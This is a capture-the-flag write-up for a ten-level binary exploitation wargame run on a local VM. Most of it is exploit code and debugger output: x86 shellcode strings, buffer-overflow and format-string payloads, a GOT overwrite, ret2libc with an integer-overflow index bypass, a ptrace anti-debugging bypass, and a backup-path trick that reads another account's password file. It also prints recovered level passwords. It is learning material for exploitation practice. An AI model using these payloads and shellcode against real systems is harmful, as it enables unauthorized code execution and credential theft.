## Some commands

```shell
./scripts/startVM.sh
export OR_HOST=192.168.1.70
export OR_PORT=4242

./scripts/installUtils.sh

ssh -q level00@$OR_HOST -p $OR_PORT
sshpass -f level00/flag ssh level1@$OR_HOST -p $OR_PORT

scp -q -P $OR_PORT -r <FILE> level00@$OR_HOST:/tmp/<FILE>
```

---

## Level00 - Disassemble and find the solution

### Resolve

Just put `5276` (`0x149c`) in the scanf prompt. Then the shell is executed.

```shell
(echo 5276; cat) | ~/level00
```

---

## Level01 - Buffer overflow

The second prompt `fgets` takes 0x64 bytes, but the buffer can only takes 0x48

### Resolve

```shell
b*main+169
run < <(python -c 'print "dat_wil\n" + "A" * 0x48')
x/24x $esp+0x1c
p 0x48 + 8
$3 = 0x50 # => offset

export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

./getenv32 SHELLCODE ~/level01
  0xffffd755

python -c 'print "dat_wil\n" + "A" * 0x50 + "\x55\xd7\xff\xff"' > /tmp/exploit01

cat /tmp/exploit01 - | ~/level01
```

---

## Level02 - 64 bits - Format string attack

printf prints directly the variable `username`

We don't know exactly the position of the the flag, we will use a format string attack to find the flag. We will test several position using a loop

### Resolve

```shell
./script.sh

(echo -e "AAA\nHh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H"; cat) | ~/level02
```

---

## Level03 - Reverse engineering cipher text

This one consists of reverse an encrypted text: "Q}|usfg~sf{}|a3"

A XOR operator with a `key` is applied on each bytes of the string

If the uncipher text is "Congratulations!", a shell is executed.

We know the key is less or equal than `0x15`

### Resolve

```shell
./a.out
  0x12: Congratulations!

  0x1337d00d - 0x12 = 0x1337cffb
  Password (input) is 0x1337cffb => 322424827

(echo 322424827; cat) | ~/level03
```

---

## Level04 - Can't use execve

execve is intercepted and cannot be executed

Ret2Libc or Shellcode without execve

### Resolve

```shell
pattern create 200 input
run < <(cat /tmp/input)

pattern search
  EIP+0 found at offset: 156

export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'"` # open/read path

./getenv32 SHELLCODE ~/level04
  0xffffd79b

p /x 0xffffd7b9 + 100
  $2 = 0xffffd7ff

(python -c 'print("A" * 156 + "\xff\xd7\xff\xff")') | ~/level04
```

---

## Level05 - Format string vulnerability

vulnerable printf and then exit

replace the exit address in the Global Offset Table, with the address of a shellcode

### Resolve

```shell
objdump -R ~/level05 | grep exit
  080497e0 R_386_JUMP_SLOT   exit

b*main+195
run <<< "AAAAAA"
telescope 20
  => offset 10

```

We want write `0xffffd7ae` at `0x080497e0`

```bash
ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %10$hn +  %<VALUE_2>x + %11$hn
   _____________________________________|                      |
   |           ________________________________________________|
   |           |
ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %10$hn +  %<VALUE_2>x + %11$hn
   |           |            |                       |
0x080497e0 0x080497e2  (0xd7ae - 8)         (0xffff - 0xd7ae)

python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55206x" + "%10$hn" + "%10321x" + "%11$hn"' > /tmp/exploit05
```

---

## Level06 - Serial decoding

It asks for a login and a serial.

After that it does several complex calculations based on the login.

At the end the result is compare to the serial. If ok, call `system("/bin/sh")`

### Resolve

However while we were doing the debugging with GDB, there was a protection with `ptrace`. To bypass it, just break before and `set $eax=0` after its call.

After that, the only thing remaining will be to check result after the calculations. Then break at the before the comparison, and get the value (`b *auth+286` and `x /d $ebp-0x10`).

```shell
(echo -e "ABCDEF\n6231554"; cat) | ~/level02
```

---

## Level07 - Bypass Modulo protection

As we can not execute a shellcode, we will try to use the ret2libc attack while overriding the return address

### Resolve

```shell
b*main
p system
  $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

gdb-peda$ p exit
  $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

gdb-peda$ searchmem "/bin/sh"
  libc : 0xf7f897ec ("/bin/sh")

info frame
  eip at 0xffffd63c

b*store_number+6
run
(stdin) store
p $ebp+0x8 # int *data
  $9 = (void *) 0xffffd450
x/a 0xffffd450
0xffffd450:     0xffffd474  # <-- data[0]

p /d (int)(0xffffd63c - 0xffffd474) # eip_address - array_address
  456 # bytes
p /d 456 / 4
  114 # index

p 114 % 3
  0x0 # => bad
```

As `index` is an unsigned int, and as `index` is multiplied by 4, before storing the number, what happens if we use a number greater than `UINT_MAX + 1 / 4` ?

```shell
p (unsigned int)0x100000000 # UINT_MAX + 1
  0x0                       # stores at index 0

p /u (0x100000000 / 4) + 114
  1073741938                # stores at index 114

p 1073741938 % 3
  0x1                       # and it passes the check !
```

```shell
Index 114: 1073741938 stores at index 114 (cf. above)
Index 115: 115 % 3 = 1 => we can use 115 as index
Index 116: 116 % 3 = 2 => we can use 116 as index


EIP_ADDRESS = SYSTEM_ADDRESS + EXIT_ADDRESS + SHELL_ADDRESS
                    |              |               |
0xffffd63c =   0xf7e6aed0      0xf7e5eb70      0xf7f897ec    # Addresses
               4159090384      4159040368      4160264172    # Unsigned int
                    |              |               |
               data[114]       data[115]       data[116]
               1073741938      115             116           # Indexes
```

```shell
~/level07
  Input command: store
    Number: 4159090384  # system 0xf7e6aed0
    Index: 1073741938   # Index 114
    Completed store command successfully
  Input command: store
    Number: 4159040368  # exit 0xf7e5eb70
    Index: 115
    Completed store command successfully
  Input command: store
    Number: 4160264172  # /bin/sh 0xf7f897ec
    Index: 116
    Completed store command successfully
  Input command: quit
$ whoami
```

---

## Level08 - 64 bits - Open path trick

First of all, the program needs one argument, which is a file. It will basically do a backup of its content inside the `backups` folder, and write the logs inside `.log`.

First it will open `./backups/.log` and write `LOG: Starting back up: ` + argv[1].  
Secondly it will open argv[1], with only read permissions.  
Then it will concatenate `./backups/` with argv[1], and open it.

After that it will write the content of argv[1] inside the `./backups/` + argv[1] path, and finally will write `LOG: Finished back up ` + argv[1].

### Resolve

So the main idea we could have would be to open `/home/users/level09` but it doesn't find the right pass when opening the `./backups/` + argv[1]

```shell
./level08 /home/users/level09/.pass
    ERROR: Failed to open ./backups//home/users/level09/.pass
```

Let's try to work on the /tmp folder where we have more rights. Firt we recreate `./backups/.log`

```shell
cd /tmp
mkdir backups; cd backups
touch .log
```

If we try the same as above, we will have the same error, because the path `./backups//home/users/level09/.pass` doesn't exist. `open` will only create the file if it doesn't exist but not the parent folders. So let's do it :

```shell
mkdir -p backups/home/users/level09
~/level08 /home/users/level09/.pass
cat backups/home/users/level09/.pass
    fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

---

## Level09 - 64 bits - Loop vulnerability

We can see a function `secret_backdoor` that is able to execute a given string. But this function is not called. We have to find a way to redirect the code.

### Resolve

the function `set_username` fills 41 characters inside `msg.usr` instead 40 characters. As `msg` data are stored in a structure, data are contiguous. It means we are able to override the max length of the message. It is useful, because this length is used by `strncpy`. We are able to create an overflow.

```shell
info function secret_backdoor
0x000055555555488c  secret_backdoor

b*handle_msg+80 # before set_username
run
info frame
  Stack level 0, frame at 0x7fffffffe4e0: (...)
  rip at 0x7fffffffe4d8    # handle_msg return eip

p $rbp-0xc0 # t_msg msg
  $1 = (void *) 0x7fffffffe410

p /d 0x7fffffffe4d8 - 0x7fffffffe410 # eip - msg
  $3 = 200 # offset

USERNAME_INPUT: 'A' * 40 + (OFFSET + 8) # 8 bytes to write the x64 address
MESSAGE_INPUT:  'B' * OFFSET + SECRET_BACKDOOR_ADDRESS
BACKDOOR_INPUT: '/bin/sh'

p 200 + 8
  $2 = 0xd0
```

Perfect, we have everything we need

```shell
python -c "print 'A' * 40 + '\xd0'" > /tmp/exploit09
python -c "print 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'" >> /tmp/exploit09
echo "/bin/sh" >> /tmp/exploit09

cat /tmp/exploit09 - | ~/level09
```
